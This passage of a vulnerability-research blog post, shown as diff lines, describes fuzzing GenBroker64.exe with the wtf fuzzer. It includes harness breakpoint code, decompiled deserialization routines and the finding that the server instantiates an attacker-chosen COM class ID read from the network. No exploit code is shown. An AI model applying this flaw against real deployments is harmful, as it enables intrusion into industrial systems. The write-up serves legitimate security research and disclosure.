+<span class="w">        </span><span class="n">Backend</span><span class="o">-&gt;</span><span class="n">Stop</span><span class="p">(</span><span class="n">Ok_t</span><span class="p">());</span>
+<span class="w">      </span><span class="p">}))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">SetBreakpoint</span><span class="p">(</span>
+<span class="w">          </span><span class="s">&quot;combase!CoCreateInstance&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[](</span><span class="n">Backend_t</span><span class="w"> </span><span class="o">*</span><span class="n">Backend</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">DebugPrint</span><span class="p">(</span><span class="s">&quot;combase!CoCreateInstance({:#x})</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
+<span class="w">                       </span><span class="n">Backend</span><span class="o">-&gt;</span><span class="n">VirtRead8</span><span class="p">(</span><span class="n">Gva_t</span><span class="p">(</span><span class="n">Backend</span><span class="o">-&gt;</span><span class="n">Rcx</span><span class="p">())));</span>
+<span class="w">            </span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">Stop</span><span class="p">(</span><span class="n">Ok_t</span><span class="p">());</span>
+<span class="w">          </span><span class="p">}))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="n">Gva_t</span><span class="w"> </span><span class="n">DnsCacheIsKnownDns</span><span class="p">(</span><span class="mh">0x1400794F0</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">SetBreakpoint</span><span class="p">(</span><span class="n">DnsCacheIsKnownDns</span><span class="p">,</span><span class="w"> </span><span class="p">[](</span><span class="n">Backend_t</span><span class="w"> </span><span class="o">*</span><span class="n">Backend</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">DebugPrint</span><span class="p">(</span><span class="s">&quot;DnsCacheIsKnownDns</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">SimulateReturnFromFunction</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="n">Gva_t</span><span class="w"> </span><span class="n">CMemFileGrowFile</span><span class="p">(</span><span class="mh">0x14009653B</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">SetBreakpoint</span><span class="p">(</span><span class="n">CMemFileGrowFile</span><span class="p">,</span><span class="w"> </span><span class="p">[](</span><span class="n">Backend_t</span><span class="w"> </span><span class="o">*</span><span class="n">Backend</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">DebugPrint</span><span class="p">(</span><span class="s">&quot;CMemFile::GrowFile</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">Stop</span><span class="p">(</span><span class="n">Ok_t</span><span class="p">());</span>
+<span class="w">      </span><span class="p">}))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">SetBreakpoint</span><span class="p">(</span><span class="s">&quot;KERNELBASE!Sleep&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[](</span><span class="n">Backend_t</span><span class="w"> </span><span class="o">*</span><span class="n">Backend</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">DebugPrint</span><span class="p">(</span><span class="s">&quot;KERNELBASE!Sleep</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">Stop</span><span class="p">(</span><span class="n">Ok_t</span><span class="p">());</span>
+<span class="w">      </span><span class="p">}))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">SetBreakpoint</span><span class="p">(</span><span class="s">&quot;nt!MiIssuePageExtendRequest&quot;</span><span class="p">,</span>
+<span class="w">                                </span><span class="p">[](</span><span class="n">Backend_t</span><span class="w"> </span><span class="o">*</span><span class="n">Backend</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                                  </span><span class="n">DebugPrint</span><span class="p">(</span><span class="s">&quot;nt!MiIssuePageExtendRequest</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">                                  </span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">Stop</span><span class="p">(</span><span class="n">Ok_t</span><span class="p">());</span>
+<span class="w">                                </span><span class="p">}))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="c1">//</span>
+<span class="w">  </span><span class="c1">// Install the usermode crash detection hooks.</span>
+<span class="w">  </span><span class="c1">//</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">SetupUsermodeCrashDetectionHooks</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>At that point I just ran it on my laptop, manually crafted a few packets as a starting corpus, went back to manual analysis and finally went to bed calling it quits for the day. </p>
+<p>I woke up the next morning and was welcomed with a few findings made by the fuzzer which is always exciting. It's a little bit like waking up early on Christmas morning hoping to find gifts under the tree 🎄. After taking a look at them though, reality came back pretty fast and I realized that all the findings were some of the low severity ones I mentioned earlier that I had already found. Oh well, whatever; that's how it goes sometimes. I still let the fuzzer that week while I was slowly drilling through the code.</p>
+<p>I eventually started to feel more and more pressure as the deadline was approaching. It also seemed that my progress understanding the target manually were slowly stalling. It didn't feel good. It's usually a good time for me to take a break when I am starting to feel this way to recharge for a bit. Over the years, I reverse-engineered myself enough times to know that I need to pair vulnerability research projects with an easier projects where progress is more easily measured to get regular dopamine doses. This is how I trick myself into not feeling too down on myself, recharge morale and put myself into a position where I am ready to get back on the vulnerability research grind. It is slow, filled with failures, and can be challenging to keep going. </p>
+<p>I decided to come back to the fuzzer I had been running unsupervised.</p>
+<h2 id="triaging-findings">Triaging findings</h2>
+<p>One design choice (probably a poor one) that I made when I built <a href="https://github.com/0vercl0k/wtf">wtf</a> was to not handle any I/O happening in the runtime environment. It also stops execution when a context-switch occurs to avoid executing code from a process that isn't of interest. Both of those behaviors combined, means that the fuzzer usually creates non only crashes, but also testcases that lead to a context-switch. In general, it can be seen as a symptom of poor harnessing. Why poor harnessing? Well, because usually hitting those conditions mean that your testcase stops executing before it should.</p>
+<p>I had a lot of those testcases and taking a look at them closely could be a good idea to improve the fuzzing campaign. Doing this is pretty time consuming because it usually highlights an area of the code that you don't know much about and you need to answer the question "how to handle it properly". And the answer to this question is completely dependent on your target. This coupled with the fact that ""debugging"" testcases in <a href="https://github.com/0vercl0k/wtf">wtf</a> is extremely primitive: you only have an execution trace that spans user-mode and kernel execution. It's usually gibabytes to scroll through and isn't the most thing to do.</p>
+<p>I eventually found a very bizarre one. The execution stopped while trying to load a COM object which triggered an I/O and a context switch. After looking closer, it also seemed to be triggered from an area of the code I thought I knew very well: the deserialization layer. After digging even deeper, it even appeared that the class ID of the COM object being loaded came directly from the testcase... what the hell 😮 This seemed completely crazy that this server would instantiate an arbitrary COM object and I immediately thought this was a bug either in the way I harnessed the target or in the way I was inserting the testcase in memory. I started to build a PoC to try to reproduce and debug this on the VM and I verified that I would indeed deserialize a class ID sent on the socket and instantiate it, wild.</p>
+<p>One of the first obversation I made was that the code that reads the COM class ID from the socket isn't part of <code>GenBroker64.exe</code>. This is silly but it made me feel slightly better as I hadn't missed it. What I had missed though was that there was a code-path from <code>GenBroker64.exe</code> leading to this function which I had missed, and this never feels great.</p>
+<p>How did I miss this while spending so much time in this area? The code doing the deserialization was basically a big switch-case statement where each case is handling a specific message type. Each of those messages are made of primitive types like string, integers, arrays, etc. So each message type has a deserialization function that invokes the various helper functions to deserialize the types they expect. Here's an example:</p>
+<div class="highlight"><pre><span></span><code><span class="nb nb-Type">void</span><span class="w"> </span><span class="n">__fastcall</span><span class="w"> </span><span class="n">PayloadReq89AB_t</span><span class="p">::</span><span class="n">ReadFromArchive</span><span class="p">(</span><span class="n">PayloadReq89AB_t</span><span class="w"> </span><span class="o">*</span><span class="n">Payload</span><span class="p">,</span><span class="w"> </span><span class="n">Archive_t</span><span class="w"> </span><span class="o">*</span><span class="n">Archive</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="o">//</span><span class="w"> </span><span class="o">...</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="n">Archive</span><span class="o">-&gt;</span><span class="n">m_nMode</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">ArchiveReadMode</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span>
+<span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadUint32</span><span class="p">(</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="n">Payload</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Utils</span><span class="p">::</span><span class="n">ReadVariant</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">Variant1</span><span class="p">,</span><span class="w"> </span><span class="n">Archive</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadString</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">String1</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadUint32__</span><span class="p">(</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">pad</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadUint32__</span><span class="p">(</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">pad</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadUint32__</span><span class="p">(</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">pad</span><span class="p">[</span><span class="mi">8</span><span class="p">]);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadUint32_</span><span class="p">(</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">pad</span><span class="p">[</span><span class="mi">12</span><span class="p">]);</span>
+<span class="w">    </span><span class="n">Utils</span><span class="p">::</span><span class="n">ReadVariant</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">Variant2</span><span class="p">,</span><span class="w"> </span><span class="n">Archive</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Utils</span><span class="p">::</span><span class="n">ReadVariant</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">Variant3</span><span class="p">,</span><span class="w"> </span><span class="n">Archive</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Utils</span><span class="p">::</span><span class="n">ReadVariant</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">Variant4</span><span class="p">,</span><span class="w"> </span><span class="n">Archive</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Utils</span><span class="p">::</span><span class="n">ReadVariant</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">Variant5</span><span class="p">,</span><span class="w"> </span><span class="n">Archive</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Utils</span><span class="p">::</span><span class="n">ReadVariant</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">Variant6</span><span class="p">,</span><span class="w"> </span><span class="n">Archive</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadString</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">String2</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadUint32</span><span class="p">(</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">D0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadString</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">String3</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadString</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">String4</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadString</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">String5</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadString</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">String6</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadString</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">String7</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadString</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">String8</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadString</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">String9</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadString</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">StringA</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadUint32</span><span class="p">(</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">Q90</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Utils</span><span class="p">::</span><span class="n">ReadVariant</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">Variant7</span><span class="p">,</span><span class="w"> </span><span class="n">Archive</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadString</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">StringB</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="p">::</span><span class="n">ReadUint32</span><span class="p">(</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">Dunno</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="o">//</span><span class="w"> </span><span class="o">...</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>One of those primitive types is a <a href="https://learn.microsoft.com/en-us/windows/win32/winauto/variant-structure">VARIANT</a>. For those who aren't familiar with this structure which is used a lot in Windows, it basically made of an integer that tells you how to interpret the data that follows. From a C perspective, the type is an integer and then you have a giant union with every possible types that follows it.</p>
+<div class="highlight"><pre><span></span><code><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">tagVARIANT</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">VARTYPE</span><span class="w"> </span><span class="n">vt</span><span class="p">;</span>
+<span class="w">    </span><span class="n">WORD</span><span class="w">    </span><span class="n">wReserved1</span><span class="p">;</span>
+<span class="w">    </span><span class="n">WORD</span><span class="w">    </span><span class="n">wReserved2</span><span class="p">;</span>
+<span class="w">    </span><span class="n">WORD</span><span class="w">    </span><span class="n">wReserved3</span><span class="p">;</span>
+<span class="w">    </span><span class="k">union</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">LONGLONG</span><span class="w">     </span><span class="n">llVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">LONG</span><span class="w">         </span><span class="n">lVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">BYTE</span><span class="w">         </span><span class="n">bVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">SHORT</span><span class="w">        </span><span class="n">iVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">FLOAT</span><span class="w">        </span><span class="n">fltVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">DOUBLE</span><span class="w">       </span><span class="n">dblVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">VARIANT_BOOL</span><span class="w"> </span><span class="n">boolVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">VARIANT_BOOL</span><span class="w"> </span><span class="n">__OBSOLETE__VARIANT_BOOL</span><span class="p">;</span>
+<span class="w">      </span><span class="n">SCODE</span><span class="w">        </span><span class="n">scode</span><span class="p">;</span>
+<span class="w">      </span><span class="n">CY</span><span class="w">           </span><span class="n">cyVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">DATE</span><span class="w">         </span><span class="n">date</span><span class="p">;</span>
+<span class="w">      </span><span class="n">BSTR</span><span class="w">         </span><span class="n">bstrVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">IUnknown</span><span class="w">     </span><span class="o">*</span><span class="n">punkVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">IDispatch</span><span class="w">    </span><span class="o">*</span><span class="n">pdispVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">SAFEARRAY</span><span class="w">    </span><span class="o">*</span><span class="n">parray</span><span class="p">;</span>
+<span class="w">      </span><span class="n">BYTE</span><span class="w">         </span><span class="o">*</span><span class="n">pbVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">SHORT</span><span class="w">        </span><span class="o">*</span><span class="n">piVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">LONG</span><span class="w">         </span><span class="o">*</span><span class="n">plVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">LONGLONG</span><span class="w">     </span><span class="o">*</span><span class="n">pllVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">FLOAT</span><span class="w">        </span><span class="o">*</span><span class="n">pfltVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">DOUBLE</span><span class="w">       </span><span class="o">*</span><span class="n">pdblVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">VARIANT_BOOL</span><span class="w"> </span><span class="o">*</span><span class="n">pboolVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">VARIANT_BOOL</span><span class="w"> </span><span class="o">*</span><span class="n">__OBSOLETE__VARIANT_PBOOL</span><span class="p">;</span>
+<span class="w">      </span><span class="n">SCODE</span><span class="w">        </span><span class="o">*</span><span class="n">pscode</span><span class="p">;</span>
+<span class="w">      </span><span class="n">CY</span><span class="w">           </span><span class="o">*</span><span class="n">pcyVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">DATE</span><span class="w">         </span><span class="o">*</span><span class="n">pdate</span><span class="p">;</span>
+<span class="w">      </span><span class="n">BSTR</span><span class="w">         </span><span class="o">*</span><span class="n">pbstrVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">IUnknown</span><span class="w">     </span><span class="o">**</span><span class="n">ppunkVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">IDispatch</span><span class="w">    </span><span class="o">**</span><span class="n">ppdispVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">SAFEARRAY</span><span class="w">    </span><span class="o">**</span><span class="n">pparray</span><span class="p">;</span>
+<span class="w">      </span><span class="n">VARIANT</span><span class="w">      </span><span class="o">*</span><span class="n">pvarVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">PVOID</span><span class="w">        </span><span class="n">byref</span><span class="p">;</span>
+<span class="w">      </span><span class="n">CHAR</span><span class="w">         </span><span class="n">cVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">USHORT</span><span class="w">       </span><span class="n">uiVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">ULONG</span><span class="w">        </span><span class="n">ulVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">ULONGLONG</span><span class="w">    </span><span class="n">ullVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">INT</span><span class="w">          </span><span class="n">intVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">UINT</span><span class="w">         </span><span class="n">uintVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">DECIMAL</span><span class="w">      </span><span class="o">*</span><span class="n">pdecVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">CHAR</span><span class="w">         </span><span class="o">*</span><span class="n">pcVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">USHORT</span><span class="w">       </span><span class="o">*</span><span class="n">puiVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">ULONG</span><span class="w">        </span><span class="o">*</span><span class="n">pulVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">ULONGLONG</span><span class="w">    </span><span class="o">*</span><span class="n">pullVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">INT</span><span class="w">          </span><span class="o">*</span><span class="n">pintVal</span><span class="p">;</span>
+<span class="w">      </span><span class="n">UINT</span><span class="w">         </span><span class="o">*</span><span class="n">puintVal</span><span class="p">;</span>
+<span class="w">      </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">PVOID</span><span class="w">       </span><span class="n">pvRecord</span><span class="p">;</span>
+<span class="w">        </span><span class="n">IRecordInfo</span><span class="w"> </span><span class="o">*</span><span class="n">pRecInfo</span><span class="p">;</span>
+<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="n">__VARIANT_NAME_4</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="n">__VARIANT_NAME_3</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="n">__VARIANT_NAME_2</span><span class="p">;</span>
+<span class="w">  </span><span class="n">DECIMAL</span><span class="w"> </span><span class="n">decVal</span><span class="p">;</span>
+<span class="p">}</span><span class="w"> </span><span class="n">VARIANT</span><span class="p">;</span>
+</code></pre></div>
+
+
+<p>It's a bit of an unfamous structure because it led to many bugs as very easy to misuse. <code>Utils::ReadVariant</code> is how I called the deserialization function and it roughly looked like this:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">Utils::ReadVariant</span><span class="p">(</span><span class="n">tagVARIANT</span><span class="w"> </span><span class="o">*</span><span class="n">Variant</span><span class="p">,</span><span class="w"> </span><span class="n">Archive_t</span><span class="w"> </span><span class="o">*</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">Level</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">TRY</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ReadVariant_</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">COleVariant</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Variant</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="n">CATCH_ALL</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">VariantClear</span><span class="p">(</span><span class="n">Variant</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="n">HRESULT</span><span class="w"> </span><span class="nf">Utils::ReadVariant_</span><span class="p">(</span><span class="n">tagVARIANT</span><span class="w"> </span><span class="o">*</span><span class="n">Variant</span><span class="p">,</span><span class="w"> </span><span class="n">Archive_t</span><span class="w"> </span><span class="o">*</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">Level</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">VARTYPE</span><span class="w"> </span><span class="n">VarType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Archive</span><span class="p">.</span><span class="n">ReadUint16</span><span class="p">();</span>
+<span class="w">  </span><span class="k">if</span><span class="p">((</span><span class="n">VarType</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">VT_ARRAY</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="c1">// Special logic to unpack arrays..</span>
